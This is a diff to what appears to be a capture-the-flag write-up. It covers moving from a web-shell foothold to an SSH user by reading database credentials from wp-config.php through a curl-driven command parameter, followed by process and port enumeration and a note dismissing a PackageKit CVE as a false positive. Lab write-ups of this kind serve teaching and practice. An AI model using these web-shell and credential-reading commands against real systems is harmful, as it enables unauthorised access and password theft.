@@ -190,7 +190,7 @@ curl -sk --data-urlencode "c=id" \
 
 ### www-data → walter
 
-`wp-config.php` (readable by `www-data`) holds the database credentials, and **the password is reused for SSH**:
+`wp-config.php` (readable by `www-data`) holds the database credentials, and **the password is reused for SSH**. Public writeups disagree on the engine behind those credentials (MySQL — often called MariaDB in the docs — versus SQLite); on the box, `wp-config.php` is what settles it:
 
 ```bash
 curl -sk --data-urlencode 'c=grep -E "DB_USER|DB_PASSWORD" /var/www/html/wp-config.php' \
@@ -209,6 +209,8 @@ ps aux | grep -vE '^\[|kthread|kworker' | head -30
 ss -ltnp
 ls -la /opt
 ```
+
+`pspy` also flashes **PackageKit** (CVE-2026-41651) and it is a **false positive** here: the installed build is not the vulnerable one and that path never reaches root. Do not burn time on it.
 
 The relevant line:
 
